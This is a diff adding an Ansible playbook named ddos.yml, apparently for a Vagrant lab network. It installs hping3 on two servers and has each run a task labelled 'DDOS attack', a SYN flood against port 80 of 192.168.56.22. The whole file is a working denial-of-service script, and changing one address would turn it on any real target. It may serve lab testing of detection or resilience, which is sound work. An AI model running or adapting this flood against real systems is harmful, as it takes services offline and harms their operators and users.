@@ -1,0 +1,32 @@
+--- 
+
+# To run this playbook: ansible-playbook -i .vagrant/provisioners/ansible/inventory/vagrant_ansible_inventory ddos.yml -f 2
+
+- hosts: server-1
+  become: true
+  tasks:
+    - name: Install hping3 (Ubuntu)
+      apt:
+        name: hping3
+        state: latest
+      when: ansible_distribution == "Ubuntu"
+
+    - name: DDOS attack
+      shell: hping3 -c 50000000 -d 120 -S -w 64 -p 80 --flood 192.168.56.22
+      async: 20
+      poll: 0
+      
+      
+- hosts: server-2
+  become: true
+  tasks:
+    - name: Install hping3 (Ubuntu)
+      apt:
+        name: hping3
+        state: latest
+      when: ansible_distribution == "Ubuntu"
+
+    - name: DDOS attack
+      shell: hping3 -c 50000000 -d 120 -S -w 64 -p 80 --flood 192.168.56.22
+      async: 20
+      poll: 0
